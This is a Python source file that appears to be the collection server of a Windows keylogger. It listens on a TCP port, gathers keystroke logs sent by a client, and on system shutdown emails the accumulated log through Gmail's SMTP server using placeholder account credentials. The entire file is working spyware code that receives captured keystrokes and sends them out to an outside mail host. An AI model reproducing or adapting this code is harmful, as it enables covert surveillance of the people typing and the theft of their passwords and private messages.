# Importing libs
from socket import socket, gethostbyname, gethostname, AF_INET, SOCK_STREAM
from smtplib import SMTP_SSL
from datetime import date
from win32api import SetConsoleCtrlHandler

log = ''

# Function that sends log to email if the log is more than 50 keys
def shutdown(signal):
    global log
    nlines = log.count('\n')

    if nlines >= 50:
        try:
            today = str(date.today())
            email_text = 'Subject: Your e-mail subject ' + today + '\n\n'
            email_text += log
            email_text = email_text.encode('utf-8')

            connection = SMTP_SSL('smtp.gmail.com', 465)
            connection.login('xxxxxxxxxx@gmail.com', 'xxxx xxxx xxxx xxxx') # Your email and Google App passwords created password
            connection.sendmail('', 'xxxxxxxxxx@gmail.com', email_text)     # Your email again
            connection.quit()
        except Exception:
            print("Not sent")

# Function to detect Windows shutdown
SetConsoleCtrlHandler(shutdown, 1)

# Creating and starting the server
server = socket(AF_INET, SOCK_STREAM)
server.bind((gethostbyname(gethostname()), 50007))
server.listen()

while True:
    try:
        # Recives log from client and add it to the service log
        conn, addr = server.accept()
        data = conn.recv(1024)
        log += data.decode()
    except Exception:
        log += ''